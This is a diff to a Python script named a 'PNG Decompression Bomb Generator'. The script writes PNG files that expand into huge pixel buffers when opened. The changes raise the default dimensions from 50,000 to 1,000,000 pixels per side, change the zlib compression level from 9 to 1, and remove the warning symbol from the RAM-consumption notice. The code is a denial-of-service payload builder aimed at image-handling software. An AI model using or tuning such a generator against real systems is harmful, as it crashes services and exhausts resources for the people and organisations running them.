@@ -38,7 +38,7 @@ def create_png_bomb(width, height, filename, mode='gray'):
     ihdr = struct.pack('>IIBBBBB', width, height, 8, color_type, 0, 0, 0)
 
     # ── Compress scanlines incrementally ──
-    comp = zlib.compressobj(9, zlib.DEFLATED, 15)
+    comp = zlib.compressobj(1, zlib.DEFLATED, 15)
     line_len = 1 + width * bpp          # filter byte + pixel data
 
     # First line: filter=0 (None), pixels = 0x80 (mid-gray)
@@ -87,8 +87,8 @@ def human(n):
 
 def main():
     ap = argparse.ArgumentParser(description='PNG Decompression Bomb Generator')
-    ap.add_argument('-W', '--width',  type=int, default=50000)
-    ap.add_argument('-H', '--height', type=int, default=50000)
+    ap.add_argument('-W', '--width',  type=int, default=1000000)
+    ap.add_argument('-H', '--height', type=int, default=1000000)
     ap.add_argument('-m', '--mode', choices=['gray', 'rgb', 'rgba'],
                     default='rgba', help='Color mode (default: rgba)')
     ap.add_argument('-o', '--output', default='bomb.png')
@@ -114,12 +114,11 @@ def main():
 
 
     file_size = create_png_bomb(W, H, args.output, args.mode)
-
     end = time.perf_counter()
     print(f"Elapsed time: {end - start:0.4f} seconds")
     print(f"Created:   '{args.output}' — {human(file_size)}")
     print(f"Ratio:     {display / file_size:,.0f}x")
-    print(f"⚠ Opening this file may consume {human(display)} of RAM!")
+    print(f"Opening this file may consume {human(display)} of RAM!")
 
 
 if __name__ == '__main__':
